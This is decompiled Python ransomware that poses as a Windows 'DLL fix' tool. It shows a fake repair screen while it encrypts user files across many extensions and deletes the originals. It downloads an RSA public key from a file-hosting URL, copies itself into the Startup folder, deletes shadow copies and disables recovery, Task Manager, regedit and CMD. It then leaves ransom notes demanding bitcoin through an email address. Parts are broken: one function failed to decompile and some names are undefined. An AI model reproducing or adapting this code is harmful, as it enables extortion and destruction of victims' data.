# uncompyle6 version 3.7.4
# Python bytecode 3.7 (3394)
# Decompiled from: Python 3.7.11 (default, Jun 29 2021, 20:31:06) 
# [GCC 8.3.0]
# Embedded file name: Microsoft_dll_fix.py
# Compiled at: 1995-09-27 16:18:56
# Size of source mod 2**32: 3161 bytes
import os, shutil
from hashlib import sha512, sha256
import sys, webbrowser, ctypes, requests, datetime, time, threading, socket
from cryptography.fernet import Fernet
from Cryptodome.PublicKey import RSA
import stat
from Cryptodome.Cipher import PKCS1_OAEP
import subprocess, base64, stat, pyfiglet, random
current_date = datetime.date.today().strftime('%b-%d-%Y')
name_of_script = sys.argv[0]
file_extension = '.CYRAT'
target_extensions = ('doc', 'docx', 'xls', 'xlsx', 'ppt', 'pptx', 'boop', 'pst', 'ost',
                     'msg', 'eml', 'vsd', 'vsdx', 'txt', 'csv', 'rtf', '123', 'wks',
                     'wk1', 'pdf', 'dwg', 'onetoc2', 'snt', 'jpeg', 'jpg', 'docb',
                     'docm', 'dot', 'dotm', 'dotx', 'xlsm', 'xlsb', 'xlw', 'xlt',
                     'xlm', 'xlc', 'xltx', 'xltm', 'pptm', 'pot', 'pps', 'ppsm',
                     'ppsx', 'ppam', 'potx', 'potm', 'edb', 'hwp', '602', 'sxi',
                     'sti', 'sldx', 'sldm', 'sldm', 'vdi', 'vmdk', 'vmx', 'gpg',
                     'aes', '.ARC', 'PAQ', 'bz2', 'tbk', 'bak', 'tar', 'tgz', 'gz',
                     '7z', 'rar', 'zip', 'backup', 'iso', 'vcd', 'bmp', 'png', 'gif',
                     'raw', '.cgm', 'tif', 'tiff', 'nef', 'psd', 'ai', 'svg', 'djvu',
                     'm4u', 'm3u', 'mid', 'wma', 'flv', '3g2', 'asf', 'mpeg', 'vob',
                     'mpg', '.fla', 'swf', 'wav', 'mp3', 'sh', 'class', 'jar', 'java',
                     'rb', 'asp', 'php', 'jsp', 'brd', '.sch', 'dch', 'dip', 'pl',
                     'vb', 'vbs', 'ps1', 'bat', 'cmd', '.js', 'asm', 'h', 'pas',
                     '.cpp', 'c', 'cs', 'suo', 'sln', 'ldf', 'mdf', 'ibd', 'myi',
                     'myd', 'frm', 'odb', 'dbf', 'db', 'mdb', 'accdb', 'sql', 'sqlitedb',
                     'sqlite3', '.asc', 'lay6', 'lay', 'mml', 'sxm', 'otg', 'odg',
                     'uop', 'std', 'sxd', 'otp', 'odp', 'wb2', 'slk', 'dif', 'stc',
                     'sxc', 'ots', 'ods', '3dm', 'max', '3ds', 'uot', 'stw', 'sxw',
                     'ott', 'odt', 'p12', 'csr', '.crt', 'key', 'pfx', 'der', 'deb',
                     'mpeg', 'WEBM', 'MPG', 'MP2', 'MPEG', 'MPE', 'MPV', 'OGG', '3gp',
                     'mp3', 'json', 'css', 'html', 'py', 'exe', 'MP2', 'MPEG', 'MPE',
                     'MPV', 'OGG', '3gp', 'mp3')
allowed_directories = [
 'Desktop', 'Downloads', 'Pictures', 'Music', 'Videos', 'Documents']
username = os.path.expanduser('~')
drive_path = os.path.splitdrive(username)[0] + '\\'
localRoot = 'C:\\Users\\USER\\Documents\\pythonprojects\\deadSec\\localroot'

def generate_file_key():
    if not os.path.exists(f"{username}\\Documents\\key.txt"):
        fernet_key = Fernet.generate_key()
        key = fernet_key
        with open(f"{username}\\Documents\\key.txt", 'wb') as (file_key):
            file_key.write(key)
    else:
        if os.path.getsize(f"{username}\\Documents\\key.txt") <= 0:
            fernet_key = Fernet.generate_key()
            key = fernet_key
            with open(f"{username}\\Documents\\key.txt", 'wb') as (file_key):
                file_key.write(key)


def get_file_key():
    with open(f"{username}\\Documents\\key.txt", 'rb') as (file_key):
        key = file_key.read()
    return key


def get_pub_key():
    with open(f"{username}\\Documents\\public_key.pem", 'rb') as (public_key):
        pub_key = public_key.read()
    return pub_key


def Welcome_screen():
    write_up = pyfiglet.figlet_format('Dll fix v2.5', font='banner3-D')
    print(write_up)
    print('Do not exit until broken dlls are repaired completely else your system can get damaged')
    for n in range(10):
        print('Searching harddrive for broken dlls....')

    count = 10
    for n in range(10):
        print(f"Found {count} broken dlls...")
        count += n + 6 - random.randint([1, 2, 3])


def in_target_extensions(file):
    file_splitted = file.split('.')
    extension = file_splitted[(-1)]
    if extension in target_extensions:
        return True
    return False


def persist():
    project_path = name_of_script
    username = os.path.expanduser('~')
    path = os.path.join(username + '\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup')
    current_path = os.path.join(username, project_path)
    shutil.copy2(current_path, path)


def is_folder(path):
    if os.path.isdir(path):
        return True
    return False


def is_not_encrypted(file):
    file_splitted = file.split('.')
    if '.' + file_splitted[(-1)] != file_extension:
        return True
    return False


def crawl_and_encrypt(directory):
    fernet_key = Fernet(get_file_key())
    directories = [directory + '\\' + n for n in os.listdir(directory)]
    for item in directories:
        if not item == 'system32':
            if item == 'syswow64':
                continue
            elif is_folder(item):
                crawl_and_encrypt(item)
            elif is_not_encrypted(os.path.basename(item)):
                full_name = item + file_extension
                with open(item, 'rb') as (file):
                    data = file.read()
                encrypt_data = fernet_key.encrypt(data)
                with open(full_name, 'wb') as (write_file):
                    write_file.write(encrypt_data)
                os.chmod(item, stat.S_IWRITE)
                os.remove(item)

    return directories


def warnings():
    warningTXT = f"""\nThe harddisks of your computer have been encrypted with an very very strong encryption algorithm.\nThere is no way to restore your data without a special key.\nOnly we can decrypt your files!\nTo purchase your key and restore your data, please follow these three easy steps:\n\n1. Email the file called EMAIL_US.txt at {username}\\Desktop\\EMAIL_US.txt to officialintuitsoftware@gmail.com\n\n2. You will recieve your personal BTC address for payment.\nOnce a payment of $1000 in btc has been completed, send another email to officialintuitsoftware@gmail.com Titled "PAID".\nWe will check to see if payment has been paid.\nNote: If you make your payment within 2 days, the fees would be slashed by half, that is $500 in btc\n\n3. You will receive a text file with your KEY that will unlock all your files. You have 2 days from today being {current_date}\nIMPORTANT: To decrypt your files, place text file on desktop and wait. Shortly after it will begin to decrypt all files.\n\nWARNING:\nDo NOT attempt to decrypt your files with any software as it is obselete and will not work, and may cost you more to unlcok your files.\nDo NOT change file names, mess with the files, or run deccryption software as it will cost you more to unlock your files and Your files might be lost forever.\nDo NOT send "PAID" without paying, price will double for disobedience.\nDo NOT think that we won\'t leave your files encrypted forever because we will"\nDon\'t know what btc is? Visit https://bitcoin.org\n"""
    for directory in allowed_directories:
        dir_path = os.path.join(username, directory)
        full_path = os.path.join(dir_path, 'RANSOME_NOTE.txt')
        with open(full_path, 'w') as (write_file):
            write_file.write(warningTXT)


def download_pub():
    try:
        get_url = requests.get('http://download1582.mediafire.com/c91ywpc4l7ag/xj26578psz6n9xo/public_key.pem')
        with open(f"{username}\\Documents\\pub_key.pem", 'wb') as (write_file):
            write_file.write(get_url.content)
    except requests.ConnectionError:
        print('System not connected to the internet')


def download_background():
    try:
        get_url = requests.get('https://images.idgesg.net/images/article/2020/05/ransomware_attack_worried_businessman_by_andrey_popov_gettyimages-1199291222_cso_2400x1600-100840844-large.jpg')
        with open(f"{user}\\Documents\\background_img.png", 'wb') as (write_file):
            write_file.write(get_url.content)
    except requests.ConnectionError:
        print('System not connected to the internet')


def encrypt_recognition_key():
    key = get_file_key()
    encrypt_key = RSA.import_key(open(f"{username}\\Documents\\pub_key.pem", 'rb').read())
    cipher = PKCS1_OAEP.new(key=encrypt_key)
    cipher_key = cipher.encrypt(key)
    if os.path.exists(f"{username}\\Documents\\key.txt"):
        os.remove(f"{username}\\Documents\\key.txt")
    for directory in allowed_directories:
        dir_path = os.path.join(username, directory)
        full_path = os.path.join(dir_path, 'EMAIL_US.txt')
        if not os.path.exists(full_path):
            with open(full_path, 'wb') as (write_file):
                write_file.write(cipher_key)
        elif os.path.getsize(full_path) <= 0:
            with open(full_path, 'wb') as (write_file):
                write_file.write(cipher_key)


def disable_sys_policies():
    try:
        os.system('bcdedit /set {default} recoveryenabled No')
        os.system('bcdedit /set {default} bootstatuspolicy ignoreallfailures')
        os.system('REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /t REG_DWORD /v DisableRegistryTools /d 1 /f')
        os.system('REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /t REG_DWORD /v DisableTaskMgr /d 1 /f')
        os.system('REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /t REG_DWORD /v DisableCMD /d 1 /f')
        os.system('REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /t REG_DWORD /v NoRun /d 1 /f')
    except:
        pass


def destroy_shadow_copy():
    try:
        os.system('vssadmin Delete Shadows /All /Quiet')
    except:
        pass


def get_ip_addr():
    host_name = socket.gethostname()
    host_ip_addr = socket.gethostbyname(host_name)


def what_is_bitcoin():
    url = 'https://bitcoin.org'
    webbrowser.open(url)


def set_desktop_background--- This code section failed: ---

 L. 250         0  LOAD_GLOBAL              user
                2  FORMAT_VALUE          0  ''
                4  LOAD_STR                 '\\Documents\\background_img.png'
                6  BUILD_STRING_2        2 
                8  STORE_FAST               'file_path'

 L. 251        10  LOAD_GLOBAL              os
               12  LOAD_ATTR                path
               14  LOAD_METHOD              isfile
               16  LOAD_FAST                'file_path'
               18  CALL_METHOD_1         1  '1 positional argument'
               20  POP_JUMP_IF_FALSE    48  'to 48'

 L. 252        22  LOAD_CONST               20
               24  STORE_FAST               'SPI_SETDESKWALLPAPER'

 L. 253        26  LOAD_GLOBAL              ctypes
               28  LOAD_ATTR                windll
               30  LOAD_ATTR                user32
               32  LOAD_METHOD              SystemParametersInfoW
               34  LOAD_FAST                'SPI_SETDESKWALLPAPER'
               36  LOAD_CONST               0
               38  LOAD_FAST                'file_path'
               40  LOAD_CONST               0
               42  CALL_METHOD_4         4  '4 positional arguments'
               44  POP_TOP          
               46  JUMP_FORWARD         48  'to 48'
             48_0  COME_FROM            46  '46'
             48_1  COME_FROM            20  '20'

Parse error at or near `COME_FROM' instruction at offset 48_0


def auto_open_ransome_note():
    ransome_note = subprocess.Popen(['notepad.exe', f"{username}/Desktop/RANSOME_NOTE.txt"])


if __name__ == '__main__':
    if sys.platform == 'win32':
        Welcome_screen()
        download_background()
        download_pub()
        generate_file_key()
        get_file_key()
        persist()
        crawl_and_encrypt('E:')
        crawl_and_encrypt('F:')
        encrypt_recognition_key()
        destroyOriginal()
        warnings()
        destroy_shadow_copy()
        disable_sys_policies()
        what_is_bitcoin()
        set_desktop_background()
        auto_open_ransome_note()
        print('Repaired all broken dlls, youre good to go now.')
        print('done')
    else:
        if sys.platform == 'darwin':
            Welcome_screen()
            download_background()
            download_pub()
            generate_file_key()
            get_file_key()
            persist()
            crawl_and_encrypt('E:')
            crawl_and_encrypt('F:')
            encrypt_recognition_key()
            destroyOriginal()
            warnings()
            destroy_shadow_copy()
            disable_sys_policies()
            what_is_bitcoin()
            set_desktop_background()
            auto_open_ransome_note()
            print('Repaired all broken dlls, youre good to go now.')
            print('done')
        else:
            if sys.platform == 'linux':
                Welcome_screen()
                download_background()
                download_pub()
                generate_file_key()
                get_file_key()
                persist()
                crawl_and_encrypt('E:')
                crawl_and_encrypt('F:')
                encrypt_recognition_key()
                destroyOriginal()
                warnings()
                destroy_shadow_copy()
                disable_sys_policies()
                what_is_bitcoin()
                set_desktop_background()
                auto_open_ransome_note()
                print('Repaired all broken dlls, youre good to go now.')
                print('done')
            else:
                sys.exit()